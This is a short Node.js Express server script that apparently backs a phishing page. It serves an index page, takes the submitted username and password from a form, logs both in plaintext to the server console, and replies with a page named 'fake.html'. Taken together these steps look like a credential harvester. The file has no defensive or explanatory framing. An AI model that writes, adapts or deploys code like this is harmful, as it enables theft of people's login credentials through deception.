const express = require("express");
const bodyParser = require("body-parser");
const ejs = require("ejs");
const request = require("request");


const app =express();

app.use(express.static("Public"));
app.use(bodyParser.urlencoded({extended:true}));


app.get("/" , function(req , res){
res.sendFile(__dirname + "/index.html");
    
})

app.post("/" ,function(req,res){
    var username = req.body.sName;
    var password = req.body.password;
    console.log(username);
    console.log(password);
    res.sendFile(__dirname+"/fake.html")
})


app.listen(process.env.PORT || 3000,function(){
    console.log("Server is Up")
})





